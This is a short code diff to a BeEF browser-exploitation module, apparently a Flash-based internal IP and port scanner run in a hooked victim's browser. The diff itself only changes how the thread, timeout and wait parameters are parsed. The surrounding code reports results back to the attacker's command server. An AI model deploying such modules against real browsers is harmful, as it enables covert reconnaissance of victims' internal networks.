@@ -9,9 +9,9 @@ beef.execute(function() {
   var ips = new Array();
   var ipRange = "<%= @ipRange %>";
   var ports   = "<%= @ports %>";
-  var threads = "<%= @threads %>";
-  var timeout = <%= @timeout %>*1000;
-  var wait = 2;
+  var threads = parseInt("<%= @threads %>", 10);
+  var timeout = parseInt("<%= @timeout %>", 10)*1000;
+  var wait    = parseInt("<%= @wait %>", 10)*1000;
 
   if(!beef.browser.hasFlash()) {
     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.are.status_error());
@@ -151,7 +151,7 @@ beef.execute(function() {
   // create worker queue
   var workers = new Array();
   for (w=0; w < threads; w++) {
-    workers.push(new WorkerQueue(wait*1000));
+    workers.push(new WorkerQueue(wait));
   }
 
   // send Flash request to each IP
